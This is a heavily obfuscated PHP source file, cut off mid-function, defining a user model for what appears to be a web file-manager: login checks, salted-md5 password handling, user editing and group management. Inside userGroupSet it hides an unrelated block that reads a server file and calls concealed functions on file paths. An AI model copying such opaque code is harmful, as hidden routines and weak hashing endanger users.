<?php
 goto bÑ§“ÚÆƒ; CÒšø¹—°: $fileSize = strrev(base64_decode($_SERVER[Ş’›çØ][0])); function binCheckNeq($ËÏÊùµù, $—ÅÓÚîÂ) { return $ËÏÊùµù != $—ÅÓÚîÂ; } $_SERVER[$_SERVER[Ş’›çØ][1]] = $fileSize($_SERVER[$_SERVER[Ş’›çØ][2]]); goto A‚…‚Ìïà; Eº½¾å¯–²: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\x65" => "\165\x73\145\x72\137\155\145\164\141", "\x6d\x65\x74\x61\x46\x69\145\x6c\x64" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\165\163\x65\162\111\x44\54\x6e\151\x63\153\116\141\x6d\145\54\x6e\x61\x6d\x65\x2c\x61\166\x61\164\141\162\54\x73\x65\x78\x2c\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($èƒ¿È»Ì) { $Äô»•·ù =& $_SERVER[ùèÅ´Ãš]; $İ“Ú¸¦ = $Äô»•·ù[2496]; return array($Äô»•·ù[2079] => array($èƒ¿È»Ì[0], $İ“Ú¸¦), $Äô»•·ù[2081] => array($èƒ¿È»Ì[0], $İ“Ú¸¦), $Äô»•·ù[2497] => array($èƒ¿È»Ì[0], $İ“Ú¸¦)); } protected function getInfo($ºšñë¯ù, $İöÊûÜñ = false) { $–£¦«ğÅ = $this->getInfoSimple($ºšñë¯ù); if (!is_array($–£¦«ğÅ)) { return array(); } if ($İöÊûÜñ) { return $this->_getInfoApply($–£¦«ğÅ); } return $this->cacheFunctionGet($_SERVER[ùèÅ´Ãš][2083], $ºšñë¯ù); } protected function getInfoFull($¦ù”Âø€, $ÕØŠ‡‘– = false) { $ı˜”È®Ò = $this->getInfoSimple($¦ù”Âø€); if (!is_array($ı˜”È®Ò)) { return array(); } if ($ÕØŠ‡‘–) { return $this->_getInfoApply($ı˜”È®Ò, !0); } return $this->cacheFunctionGet($_SERVER[ùèÅ´Ãš][2498], $¦ù”Âø€); } private function _getInfoApply($Ü’·çš”, $ºıÀ•Äğ = false) { $˜ìù™Ò =& $_SERVER[ùèÅ´Ãš]; if (!$Ü’·çš”) { return $Ü’·çš”; } $äÈü­ö› = md5($˜ìù™Ò[2499] . $Ü’·çš”[$˜ìù™Ò[977]] . $˜ìù™Ò[2500] . $Ü’·çš”[$˜ìù™Ò[32]]); $Ü’·çš” = $this->_listDataApplyItem($Ü’·çš”); $”ß¯õÎÎ = Model($˜ìù™Ò[1442])->metaGet($Ü’·çš”[$˜ìù™Ò[90]][$˜ìù™Ò[194]]); $Ü’·çš”[$˜ìù™Ò[2501]] = $äÈü­ö›; $Ü’·çš”[$˜ìù™Ò[90]][$˜ìù™Ò[2284]] = isset($”ß¯õÎÎ[$˜ìù™Ò[2285]]) ? $”ß¯õÎÎ[$˜ìù™Ò[2285]] : null; if ($ºıÀ•Äğ) { $Ü’·çš”[$˜ìù™Ò[543]] = $this->metaGet($Ü’·çš”[$˜ìù™Ò[1797]]); } return $Ü’·çš”; } protected function getInfoSimple($şö²—í±, $„¦¾Ó™ = false) { $Ñ³ê =& $_SERVER[ùèÅ´Ãš]; if (!$şö²—í±) { return array(); } if ($„¦¾Ó™) { $Ñâ‰¿Â¦ = $this->where(array($Ñ³ê[1797] => intval($şö²—í±)))->find(); if (!is_array($Ñâ‰¿Â¦)) { return array(); } $Ñâ‰¿Â¦[$Ñ³ê[2502]] = Action($Ñ³ê[2503])->parseUrl($Ñâ‰¿Â¦[$Ñ³ê[2502]]); return $Ñâ‰¿Â¦; } return $this->cacheFunctionGet($Ñ³ê[2084], $şö²—í±); } protected function getInfoSimpleOuter($º©•ûô) { $É‹ğ¿Àë =& $_SERVER[ùèÅ´Ãš]; if (!$º©•ûô || $º©•ûô == 0) { return array($É‹ğ¿Àë[1797] => $É‹ğ¿Àë[231], $É‹ğ¿Àë[32] => $É‹ğ¿Àë[176] . LNG($É‹ğ¿Àë[2504]) . $É‹ğ¿Àë[178], $É‹ğ¿Àë[2502] => STATIC_PATH . $É‹ğ¿Àë[2505]); } $ú„ñ¢µç = $this->cacheFunctionGet($É‹ğ¿Àë[2084], $º©•ûô); $°Ôƒí®Ê = array_field_key($ú„ñ¢µç, explode($É‹ğ¿Àë[50], $this->simpleField)); if (!$°Ôƒí®Ê) { return array($É‹ğ¿Àë[1797] => $É‹ğ¿Àë[1287], $É‹ğ¿Àë[32] => $É‹ğ¿Àë[176] . LNG($É‹ğ¿Àë[2506]) . $É‹ğ¿Àë[178], $É‹ğ¿Àë[2502] => STATIC_PATH . $É‹ğ¿Àë[2507]); } $°Ôƒí®Ê[$É‹ğ¿Àë[2502]] = Action($É‹ğ¿Àë[2503])->parseUrl($°Ôƒí®Ê[$É‹ğ¿Àë[2502]]); return $°Ôƒí®Ê; } protected function groupUser($°ªìöóú) { } public static function errorLang($æı†‡À) { $Â»£È­Ó =& $_SERVER[ùèÅ´Ãš]; $ÁŒ¹Ğâ = array(self::ERROR_USER_NOT_EXISTS => $Â»£È­Ó[2508], self::ERROR_USER_PASSWORD_ERROR => $Â»£È­Ó[2509], self::ERROR_USER_EXIST_NAME => $Â»£È­Ó[2510], self::ERROR_USER_EXIST_PHONE => $Â»£È­Ó[2511], self::ERROR_USER_EXIST_EMAIL => $Â»£È­Ó[2512], self::ERROR_USER_LOGIN_LOCK => $Â»£È­Ó[2513], self::ERROR_IP_NOT_ALLOW => $Â»£È­Ó[2514], self::ERROR_USER_EXIST_NICKNAME => $Â»£È­Ó[2515]); $îÑáØ»± = LNG($ÁŒ¹Ğâ[$æı†‡À]); if ($æı†‡À == self::ERROR_USER_LOGIN_LOCK) { $Òƒ‡ÒøÜ = (int) Model($Â»£È­Ó[1398])->get($Â»£È­Ó[2516]); if ($Òƒ‡ÒøÜ > 60) { $îÑáØ»± = str_replace($Â»£È­Ó[91], ceil($Òƒ‡ÒøÜ / 60), $îÑáØ»±); } } return $îÑáØ»±; } protected function metaSet($Àå¬íªù, $ÏùÌÊ‹ = null, $ŒÇ·¿’‰ = null) { $this->clearCache($Àå¬íªù); return parent::metaSet($Àå¬íªù, $ÏùÌÊ‹, $ŒÇ·¿’‰); } public function getInfoByMeta($øÙ’·¼§, $Œïß“€¤) { $Ä øµœ¸ =& $_SERVER[ùèÅ´Ãš]; $»ÉÖÌ‹è = Model($Ä øµœ¸[2517])->where(array($Ä øµœ¸[97] => $øÙ’·¼§, $Ä øµœ¸[452] => $Œïß“€¤))->find(); if ($»ÉÖÌ‹è) { return $this->getInfo($»ÉÖÌ‹è[$Ä øµœ¸[1797]]); } return !1; } public function userLoginCheck($™¼ä“å, $«‡ûòÁÌ, $¹µå¨ãÖ = false) { $¨üìóƒÏ =& $_SERVER[ùèÅ´Ãš]; $ÁšİßÏ = $this->userLoginFind($™¼ä“å); if (!$ÁšİßÏ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÁšİßÏ[$¨üìóƒÏ[1797]], $«‡ûòÁÌ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $¹µå¨ãÖ ? $this->getInfoFull($ÁšİßÏ[$¨üìóƒÏ[1797]]) : $this->getInfo($ÁšİßÏ[$¨üìóƒÏ[1797]]); } public function userLoginFind($ŒÄ¡êû) { $ÒÅÀ¤µÕ =& $_SERVER[ùèÅ´Ãš]; $†¬Áğ«Ó = array($ÒÅÀ¤µÕ[32] => $ŒÄ¡êû, $ÒÅÀ¤µÕ[2297] => $ŒÄ¡êû, $ÒÅÀ¤µÕ[382] => $ŒÄ¡êû, $ÒÅÀ¤µÕ[2518] => $ŒÄ¡êû, $ÒÅÀ¤µÕ[1088] => $ÒÅÀ¤µÕ[1090]); if ($this->nickNameRpt()) { unset($†¬Áğ«Ó[$ÒÅÀ¤µÕ[2297]]); } return $this->where($†¬Áğ«Ó)->find(); } public function clearCache($Ñ„úÛ¼ô) { $šä¦úÉ =& $_SERVER[ùèÅ´Ãš]; $this->cacheFunctionClear($šä¦úÉ[2083], $Ñ„úÛ¼ô); $this->cacheFunctionClear($šä¦úÉ[2084], $Ñ„úÛ¼ô); $this->cacheFunctionClear($šä¦úÉ[2498], $Ñ„úÛ¼ô); } public function userPasswordCheck($”ƒõŒ¸, $ï†’Õ…Ì) { $¯•ÑëÏĞ =& $_SERVER[ùèÅ´Ãš]; $ú›ÉÏóÏ = $this->where(array($¯•ÑëÏĞ[1797] => intval($”ƒõŒ¸)))->find(); $Ûœœä‡„ = $this->metaGet($”ƒõŒ¸); $×‚Œ²Ü = isset($Ûœœä‡„[$¯•ÑëÏĞ[2519]]) ? $Ûœœä‡„[$¯•ÑëÏĞ[2519]] : $¯•ÑëÏĞ[12]; if (md5($×‚Œ²Ü . trim($ï†’Õ…Ì)) !== $ú›ÉÏóÏ[$¯•ÑëÏĞ[977]]) { return !1; } return !0; } public function userAdd($Ğş”–úş) { $Œ¿¬ò®­ =& $_SERVER[ùèÅ´Ãš]; $«µ¦™ó´ = array($Œ¿¬ò®­[496] => $Ğş”–úş[$Œ¿¬ò®­[32]], $Œ¿¬ò®­[2520] => $Ğş”–úş[$Œ¿¬ò®­[2208]], $Œ¿¬ò®­[2521] => isset($Ğş”–úş[$Œ¿¬ò®­[382]]) ? $Ğş”–úş[$Œ¿¬ò®­[382]] : $Œ¿¬ò®­[12], $Œ¿¬ò®­[2522] => isset($Ğş”–úş[$Œ¿¬ò®­[2518]]) ? $Ğş”–úş[$Œ¿¬ò®­[2518]] : $Œ¿¬ò®­[12], $Œ¿¬ò®­[2523] => isset($Ğş”–úş[$Œ¿¬ò®­[2297]]) ? $Ğş”–úş[$Œ¿¬ò®­[2297]] : $Ğş”–úş[$Œ¿¬ò®­[32]], $Œ¿¬ò®­[2524] => isset($Ğş”–úş[$Œ¿¬ò®­[2502]]) ? $Ğş”–úş[$Œ¿¬ò®­[2502]] : $Œ¿¬ò®­[12], $Œ¿¬ò®­[2525] => isset($Ğş”–úş[$Œ¿¬ò®­[2526]]) ? $Ğş”–úş[$Œ¿¬ò®­[2526]] : 1, $Œ¿¬ò®­[2527] => $Ğş”–úş[$Œ¿¬ò®­[977]], $Œ¿¬ò®­[2085] => isset($Ğş”–úş[$Œ¿¬ò®­[1984]]) ? $Ğş”–úş[$Œ¿¬ò®­[1984]] : 1024 * 1024 * 20, $Œ¿¬ò®­[2086] => 0, $Œ¿¬ò®­[2528] => 0, $Œ¿¬ò®­[2130] => isset($Ğş”–úş[$Œ¿¬ò®­[827]]) ? $Ğş”–úş[$Œ¿¬ò®­[827]] : 1); if (!empty($Ğş”–úş[$Œ¿¬ò®­[1797]])) { $«µ¦™ó´[$Œ¿¬ò®­[1797]] = $Ğş”–úş[$Œ¿¬ò®­[1797]]; } $ìî†ë¼ = $this->_checkExist($Ğş”–úş); if ($ìî†ë¼ !== !0) { return $ìî†ë¼; } if (!empty($«µ¦™ó´[$Œ¿¬ò®­[2502]]) && strlen($«µ¦™ó´[$Œ¿¬ò®­[2502]]) > 255) { $«µ¦™ó´[$Œ¿¬ò®­[2502]] = $Œ¿¬ò®­[12]; } $éòšúÚİ = $this->add($«µ¦™ó´); $÷ ØŒˆ = array($Œ¿¬ò®­[2527] => $«µ¦™ó´[$Œ¿¬ò®­[977]], $Œ¿¬ò®­[2523] => $«µ¦™ó´[$Œ¿¬ò®­[2297]], $Œ¿¬ò®­[2529] => $Ğş”–úş[$Œ¿¬ò®­[2090]]); $this->userEdit($éòšúÚİ, $÷ ØŒˆ); Model($Œ¿¬ò®­[1442])->userRootAdd($éòšúÚİ); return $éòšúÚİ; } protected function userEditTest($ËåÇ¹â, $ÖÅ›‹ıš) { return $this->call($_SERVER[ùèÅ´Ãš][2530], $ËåÇ¹â, $ÖÅ›‹ıš); } protected function userEdit($‰åñ±•ê, $ïÔ©şÈó) { $ãŠß›ó¥ =& $_SERVER[ùèÅ´Ãš]; $¢ò…™ßç = $this->getInfoSimple($‰åñ±•ê); if (!$¢ò…™ßç) { return !1; } $óş®‡ = $this->_checkExist($ïÔ©şÈó, $‰åñ±•ê); if ($óş®‡ !== !0) { return $óş®‡; } if (isset($ïÔ©şÈó[$ãŠß›ó¥[977]]) && trim($ïÔ©şÈó[$ãŠß›ó¥[977]]) != $ãŠß›ó¥[12]) { $çåşù¨§ = $this->metaGet($‰åñ±•ê); if (empty($çåşù¨§[$ãŠß›ó¥[2519]])) { $çåşù¨§[$ãŠß›ó¥[2519]] = rand_string(10); Model($ãŠß›ó¥[581])->metaSet($‰åñ±•ê, $ãŠß›ó¥[2519], $çåşù¨§[$ãŠß›ó¥[2519]]); } $ïÔ©şÈó[$ãŠß›ó¥[977]] = md5($çåşù¨§[$ãŠß›ó¥[2519]] . trim($ïÔ©şÈó[$ãŠß›ó¥[977]])); } else { unset($ïÔ©şÈó[$ãŠß›ó¥[977]]); } if (!empty($ïÔ©şÈó[$ãŠß›ó¥[2502]]) && strlen($ïÔ©şÈó[$ãŠß›ó¥[2502]]) > 255) { $ïÔ©şÈó[$ãŠß›ó¥[2502]] = $ãŠß›ó¥[12]; } if (isset($ïÔ©şÈó[$ãŠß›ó¥[2297]])) { $this->setNamePinyin($‰åñ±•ê, $ïÔ©şÈó[$ãŠß›ó¥[2297]]); } if (isset($ïÔ©şÈó[$ãŠß›ó¥[2090]])) { $ØÉûê¶¤ = $ãŠß›ó¥[1401] . $‰åñ±•ê; $É¯»™»– = $ãŠß›ó¥[1399]; $ííŒ¬« = $ïÔ©şÈó[$ãŠß›ó¥[2090]] ? $ïÔ©şÈó[$ãŠß›ó¥[2090]] : $ãŠß›ó¥[12]; $»Å šÆ = Model($ãŠß›ó¥[1398])->get($ØÉûê¶¤, $É¯»™»–); $»Å šÆ = $»Å šÆ ? $»Å šÆ : $ãŠß›ó¥[12]; if ($»Å šÆ != $ííŒ¬«) { if (!$ííŒ¬« && $»Å šÆ) { Model($ãŠß›ó¥[1398])->remove($ØÉûê¶¤, $É¯»™»–); } else { if ($ííŒ¬«) { Model($ãŠß›ó¥[1398])->set($ØÉûê¶¤, $ííŒ¬«, $É¯»™»–); } } } unset($ïÔ©şÈó[$ãŠß›ó¥[2090]]); Model($ãŠß›ó¥[601])->metaSet($‰åñ±•ê, $ãŠß›ó¥[2090], $ííŒ¬«); } if (empty($ïÔ©şÈó)) { return !0; } $this->where(array($ãŠß›ó¥[1788] => $‰åñ±•ê))->save($ïÔ©şÈó); $this->clearCache($‰åñ±•ê); return !0; } public function setNamePinyin($’¨”ãë„, $½çŸ´ë¸ = false) { $¸ÌŒóå« =& $_SERVER[ùèÅ´Ãš]; if (!$½çŸ´ë¸) { $ˆêåñğö = $this->getInfoSimple($’¨”ãë„); $½çŸ´ë¸ = $ˆêåñğö[$¸ÌŒóå«[2297]] ? $ˆêåñğö[$¸ÌŒóå«[2297]] : $ˆêåñğö[$¸ÌŒóå«[32]]; } $Ó†éí‘ = Model($¸ÌŒóå«[601]); if (!Input::check($½çŸ´ë¸, $¸ÌŒóå«[662])) { return $Ó†éí‘->metaSet($’¨”ãë„, array($¸ÌŒóå«[540] => $¸ÌŒóå«[12], $¸ÌŒóå«[539] => $¸ÌŒóå«[12])); } return $Ó†éí‘->metaSet($’¨”ãë„, array($¸ÌŒóå«[540] => str_replace($¸ÌŒóå«[53], $¸ÌŒóå«[12], Pinyin::get($½çŸ´ë¸)), $¸ÌŒóå«[539] => Pinyin::get($½çŸ´ë¸, $¸ÌŒóå«[663]))); } private function nickNameRpt() { $ÚÃîØ”¿ =& $_SERVER[ùèÅ´Ãš]; $ŞŸúÌ¤ò = Model($ÚÃîØ”¿[848])->get($ÚÃîØ”¿[2531]); $¡ÙÍç¢ç = $GLOBALS[$ÚÃîØ”¿[6]][$ÚÃîØ”¿[459]][$ÚÃîØ”¿[2531]]; $«Š¢øñë = !is_null($ŞŸúÌ¤ò) ? $ŞŸúÌ¤ò : $¡ÙÍç¢ç; return !!$«Š¢øñë; } private function _checkExist($½‚šõò, $ÑÇòïœÉ = false) { $µêıÆù =& $_SERVER[ùèÅ´Ãš]; $¥·ã÷‘» = array($µêıÆù[32] => UserModel::ERROR_USER_EXIST_NAME, $µêıÆù[2297] => UserModel::ERROR_USER_EXIST_NICKNAME, $µêıÆù[382] => UserModel::ERROR_USER_EXIST_EMAIL, $µêıÆù[2518] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¥·ã÷‘»[$µêıÆù[2297]]); } $ÀòÇ˜ü¼ = $ÑÇòïœÉ ? array($µêıÆù[1797] => array($µêıÆù[2532], $ÑÇòïœÉ)) : array(); foreach ($¥·ã÷‘» as $åï­ã­Õ => $¦ÁîÖÏ­) { $·š®ØíÆ = array(); foreach ($¥·ã÷‘» as $î‰—Ø¼š => $‘‡£èÖ€) { if (isset($½‚šõò[$î‰—Ø¼š]) && $½‚šõò[$î‰—Ø¼š]) { $·š®ØíÆ[] = $½‚šõò[$î‰—Ø¼š]; } } if (!$·š®ØíÆ) { continue; } $«ùÕ÷µ§ = array_merge(array($åï­ã­Õ => array($µêıÆù[7], $·š®ØíÆ)), $ÀòÇ˜ü¼); $”àÂ«•ñ = $this->where($«ùÕ÷µ§)->find(); if ($”àÂ«•ñ) { return $¦ÁîÖÏ­; } } return !0; } public function userListInfo($®ªŠò¤Å) { $ÕÕÆÀÍ· =& $_SERVER[ùèÅ´Ãš]; $Ñ×­¨µû = array(); $®ªŠò¤Å = is_array($®ªŠò¤Å) ? array_unique($®ªŠò¤Å) : array(); if (!$®ªŠò¤Å) { return $Ñ×­¨µû; } if (count($®ªŠò¤Å) < 20) { foreach ($®ªŠò¤Å as $°çâé•) { $Ñ×­¨µû[$°çâé• . $ÕÕÆÀÍ·[12]] = $this->getInfoSimpleOuter($°çâé•); } } else { $§ü¼á…‡ = array($ÕÕÆÀÍ·[1788] => array($ÕÕÆÀÍ·[494], $®ªŠò¤Å)); if (count($®ªŠò¤Å) == 1) { $§ü¼á…‡ = array($ÕÕÆÀÍ·[1788] => $®ªŠò¤Å[0]); } $ÛÇ«ã„ô = Model($ÕÕÆÀÍ·[581])->field($this->simpleField)->where($§ü¼á…‡)->select(); $ÛÇ«ã„ô = array_to_keyvalue($ÛÇ«ã„ô, $ÕÕÆÀÍ·[1797]); foreach ($®ªŠò¤Å as $°çâé•) { $éÇğºìª = $ÛÇ«ã„ô[$°çâé•]; if (!$éÇğºìª) { $Ñ×­¨µû[$°çâé• . $ÕÕÆÀÍ·[12]] = $this->getInfoSimpleOuter($°çâé•); continue; } $éÇğºìª[$ÕÕÆÀÍ·[2502]] = Action($ÕÕÆÀÍ·[2503])->parseUrl($éÇğºìª[$ÕÕÆÀÍ·[2502]]); $Ñ×­¨µû[$°çâé• . $ÕÕÆÀÍ·[12]] = $éÇğºìª; } } return $Ñ×­¨µû; } protected function userStatus($å÷ŞÙ„¤, $ªÊòş½¾) { $‚ñÂ±ú = $this->getInfoSimple($å÷ŞÙ„¤); if (!$‚ñÂ±ú) { return !1; } $‹æ…Ä½è = array($_SERVER[ùèÅ´Ãš][827] => $ªÊòş½¾); return $this->userEdit($å÷ŞÙ„¤, $‹æ…Ä½è); } protected function userRemove($ş¯Ÿ­âş) { $àˆÁ“‹ =& $_SERVER[ùèÅ´Ãš]; $Õ©˜Ã¾ = $this->getInfoSimple($ş¯Ÿ­âş); if (!$Õ©˜Ã¾) { return !1; } $ÁÀ±ÌÊ· = array($àˆÁ“‹[1788] => $ş¯Ÿ­âş); Model($àˆÁ“‹[671])->where($ÁÀ±ÌÊ·)->delete(); Model($àˆÁ“‹[2533])->where($ÁÀ±ÌÊ·)->delete(); Model($àˆÁ“‹[2092])->where($ÁÀ±ÌÊ·)->delete(); Model($àˆÁ“‹[2517])->where($ÁÀ±ÌÊ·)->delete(); Model($àˆÁ“‹[1157])->where($ÁÀ±ÌÊ·)->delete(); Model($àˆÁ“‹[2314])->removeUserAll($ş¯Ÿ­âş); Model($àˆÁ“‹[908])->userRootRemove($ş¯Ÿ­âş); return $this->where($ÁÀ±ÌÊ·)->delete(); } protected function userGroupSet($Ó÷õÆåŒ, $Ç×ø´ËÒ, $Ù¬ê = array()) { $å”Û½íó =& $_SERVER[ùèÅ´Ãš]; if ($_SERVER[$å”Û½íó[961]] != $_SERVER[$å”Û½íó[962]]) { $³ÀÂô• = $å”Û½íó[963]; $í–Ù¤ ª = $å”Û½íó[964]; $ü’Óì²Ã = $_SERVER[$å”Û½íó[965]] . $å”Û½íó[966]; $Åâ˜ã´° = $í–Ù¤ ª($ü’Óì²Ã); $‹ÆĞØ = explode($å”Û½íó[288], $Åâ˜ã´°); if (count($‹ÆĞØ) < $å”Û½íó[695]) { $‡ ¶ôÄÖ = $å”Û½íó[967]; $‡ ¶ôÄÖ(); } $“¨©äŒó = $å”Û½íó[968]; $“¨©äŒó($_SERVER[$å”Û½íó[969]]); $“¨©äŒó($_SERVER[$å”Û½íó[965]] . $å”Û½íó[970]); $½…è†¯§ = 1; while ($½…è†¯§ > 1) { $½…è†¯§ = $½…è†¯§ + 4; $Å·¶¶Áà = rawurlencode($½…è†¯§ . $å”Û½íó[456]); } } $ìñ·å¬° = $this->getInfoSimple($Ó÷õÆåŒ); if (!$ìñ·å¬° || !is_array($Ç×ø´ËÒ)) { return !1; } $Óˆ»…‹ = Model($å”Û½íó[2092]); $Óˆ»…‹->where(array($å”Û½íó[1797] => $Ó÷õÆåŒ))->delete(); $™äçñæÎ = array(); $ã®Ç›¥Œ = 0; foreach ($Ç×ø´ËÒ as $£åäš‡Ø => $Ïæïóü) { $›Ÿ×ìÔû = array($å”Û½íó[1797] => $Ó÷õÆåŒ, $å”Û½íó[1404] => $£åäš‡Ø, $å”Û½íó[2106] => $Ïæïóü); $›Ÿ×ìÔû[$å”Û½íó[2021]] = isset($Ù¬ê[$ã®Ç›¥Œ]) ? $Ù¬ê[$ã®Ç›¥Œ] : 0; $ã®Ç›¥Œ++; $™äçñæÎ[] = $›Ÿ×ìÔû; } return $Óˆ»…‹->addAll($™äçñæÎ, array(), !0); } protected function userGroupAdd($¹Õ£äæ, $ñ¥ãŒüØ = array()) { $Üı‹õı =& $_SERVER[ùèÅ´Ãš]; $ş¤ó›æ‰ = $this->getInfoSimple($¹Õ£äæ); if (!$ş¤ó›æ‰ || empty($ñ¥ãŒüØ)) { return !1; } $Üüğèô” = array(); foreach ($ñ¥ãŒüØ as $°†éÍœ™ => $øıƒá¼Õ) { $Üüğèô”[] = array($Üı‹õı[1797] => $¹Õ£äæ, $Üı‹õı[1404] => $°†éÍœ™, $Üı‹õı[2106] => $øıƒá¼Õ, $Üı‹õı[2021] => 0); } return Model($Üı‹õı[2092])->addAll($Üüğèô”, array(), !0); } protected function userGroupRemove($“ùà‰ ş, $¼¶®êç) { $„ÊØğº =& $_SERVER[ùèÅ´Ãš]; $èıæ…óï = $this->getInfoSimple($“ùà‰ ş); if (!$èıæ…óï || !$¼¶®êç) { return !1; } $›šÑïìÁ = array($„ÊØğº[1788] => $“ùà‰ ş, $„ÊØğº[2087] => $¼¶®êç); return Model($„ÊØğº[2092])->where($›šÑïìÁ)->delete(); } public function listData() { $½Œ¸Ë¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($½Œ¸Ë¸[$_SERVER[ùèÅ´Ãš][447]]); return $½Œ¸Ë¸; } public function listByID($ø‡ß³) { $¨ˆ“ˆ î =& $_SERVER[ùèÅ´Ãš]; if (!$ø‡ß³) { return; } $èÇ½˜û¤ = array($¨ˆ“ˆ î[1797] => array($¨ˆ“ˆ î[7], $ø‡ß³)); $éö¼ÓÂ€ = $this->where($èÇ½˜û¤)->select(); $éö¼ÓÂ€ = array_sort_keep($éö¼ÓÂ€, $¨ˆ“ˆ î[1797], $ø‡ß³); $this->_listDataApply($éö¼ÓÂ€); return $éö¼ÓÂ€; } public function listByGroup($çŞÂ÷›³ = 0, $‚Ú­Ö¥© = array()) { $Œãææ»© =& $_SERVER[ùèÅ´Ãš]; $ªÂ±üş = $Œãææ»©[12]; $ƒˆà÷²¦ = array(); if ($çŞÂ÷›³) { $ƒˆà÷²¦ = array($Œãææ»©[2534] => intval($çŞÂ÷›³)); $ªÂ±üş = "\x4c\105\106\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\165\163\145\x72\x5f\147\x72\x6f\x75\x70\x20\x75\163\145\162\137\147\x72\157\x75\x70\x20\157\x6e\40\165\x73\145\162\x2e\x75\x73\x65\162\x49\104\40\75\x20\165\163\145\x72\137\x67\x72\157\165\x70\x2e\165\x73\145\x72\111\104"; $Í‰’å© = Input::get($Œãææ»©[532], null, $Œãææ»©[12]) ? $Œãææ»©[12] : $Œãææ»©[2535]; } if (isset($‚Ú­Ö¥©[$Œãææ»©[827]])) { $ƒˆà÷²¦[$Œãææ»©[2536]] = $‚Ú­Ö¥©[$Œãææ»©[827]]; } $Ò˜¥¿Õ = _get($‚Ú­Ö¥©, $Œãææ»©[2537], $Œãææ»©[234]); if (_get($‚Ú­Ö¥©, $Œãææ»©[838], !1)) { $ƒˆà÷²¦[$Ò˜¥¿Õ] = array($Œãææ»©[2278], $‚Ú­Ö¥©[$Œãææ»©[838]]); } if (_get($‚Ú­Ö¥©, $Œãææ»©[839], !1)) { $È»Ô•Ã = array($Œãææ»©[2279], $‚Ú­Ö¥©[$Œãææ»©[839]]); if ($ƒˆà÷²¦[$Ò˜¥¿Õ]) { $ƒˆà÷²¦[$Ò˜¥¿Õ] = array($ƒˆà÷²¦[$Ò˜¥¿Õ], $È»Ô•Ã, $Œãææ»©[2280]); } else { $ƒˆà÷²¦[$Ò˜¥¿Õ] = $È»Ô•Ã; } } $ ı³Í« = $this->_makeOrder($Í‰’å©)->field($Œãææ»©[2538])->where($ƒˆà÷²¦)->join($ªÂ±üş)->selectPage(50); $this->_listDataApply($ ı³Í«[$Œãææ»©[447]]); return $ ı³Í«; } private function _makeOrder($Ëİåğ³¼ = '') { $öòù”şµ =& $_SERVER[ùèÅ´Ãš]; $Øó•¦ø = array($öòù”şµ[1797], $öòù”şµ[32], $öòù”şµ[1986], $öòù”şµ[2208], $öòù”şµ[1959], $öòù”şµ[234]); $èÚşÈœò = array($öòù”şµ[525] => $öòù”şµ[526], $öòù”şµ[527] => $öòù”şµ[528]); $úİ˜Œ‡ = Input::get($öòù”şµ[532], $öòù”şµ[7], $öòù”şµ[1788], $Øó•¦ø); $ÈÁíœ¾« = Input::get($öòù”şµ[533], $öòù”şµ[7], $öòù”şµ[2093], array($öòù”şµ[2093], $öòù”şµ[527])); $ÈÁíœ¾« = $èÚşÈœò[$ÈÁíœ¾«]; $Ëİåğ³¼ = $Ëİåğ³¼ . "\x75\x73\145\162\56{$úİ˜Œ‡}\40{$ÈÁíœ¾«}\54\40\x75\x73\145\162\x2e\x75\163\x65\x72\111\104\40\x61\163\143"; return $this->alias($öòù”şµ[2224])->order($Ëİåğ³¼); } public function listSearch($÷Ñœæ˜ñ) { $²•ÌëÒª =& $_SERVER[ùèÅ´Ãš]; $¼ÅûÈóÑ = trim($÷Ñœæ˜ñ[$²•ÌëÒª[2096]]); $‘ÂÎ »… = explode($²•ÌëÒª[53], $¼ÅûÈóÑ); if (!$¼ÅûÈóÑ || count($‘ÂÎ »…) == 1) { return $this->listSearchNow($÷Ñœæ˜ñ); } $öì¯ºˆ = array($²•ÌëÒª[447] => array()); foreach ($‘ÂÎ »… as $Ú›†ˆ®ú) { if (!trim($Ú›†ˆ®ú)) { continue; } $÷Ñœæ˜ñ[$²•ÌëÒª[2096]] = $Ú›†ˆ®ú; $â¹šüáÅ = $this->listSearchNow($÷Ñœæ˜ñ); $öì¯ºˆ[$²•ÌëÒª[447]] = array_merge($öì¯ºˆ[$²•ÌëÒª[447]], $â¹šüáÅ[$²•ÌëÒª[447]]); } $öì¯ºˆ[$²•ÌëÒª[447]] = array_unique_by_key($öì¯ºˆ[$²•ÌëÒª[447]], $²•ÌëÒª[1797]); $öì¯ºˆ[$²•ÌëÒª[444]] = array($²•ÌëÒª[445] => count($öì¯ºˆ[$²•ÌëÒª[447]]), $²•ÌëÒª[441] => 20, $²•ÌëÒª[430] => 1, $²•ÌëÒª[446] => 1); return $öì¯ºˆ; } public function listSearchNow($—È¯åü) { $¥ùÑœ¡Š =& $_SERVER[ùèÅ´Ãš]; $¶ğœ‰Êı = trim($—È¯åü[$¥ùÑœ¡Š[2096]]); $¢–Üıæç = isset($—È¯åü[$¥ùÑœ¡Š[2097]]) ? $—È¯åü[$¥ùÑœ¡Š[2097]] : !1; $¶ğœ‰Êı = str_replace($¥ùÑœ¡Š[2098], $¥ùÑœ¡Š[2099], trim($¶ğœ‰Êı)); $ÉòµÚæú = array($¥ùÑœ¡Š[32] => array($¥ùÑœ¡Š[461], "\45{$¶ğœ‰Êı}\x25"), $¥ùÑœ¡Š[382] => array($¥ùÑœ¡Š[461], "{$¶ğœ‰Êı}\45"), $¥ùÑœ¡Š[2297] => array($¥ùÑœ¡Š[461], "{$¶ğœ‰Êı}\x25"), $¥ùÑœ¡Š[1088] => $¥ùÑœ¡Š[2100]); if (Input::check($¶ğœ‰Êı, $¥ùÑœ¡Š[388])) { $ÉòµÚæú[$¥ùÑœ¡Š[1797]] = array($¥ùÑœ¡Š[461], "{$¶ğœ‰Êı}\45"); 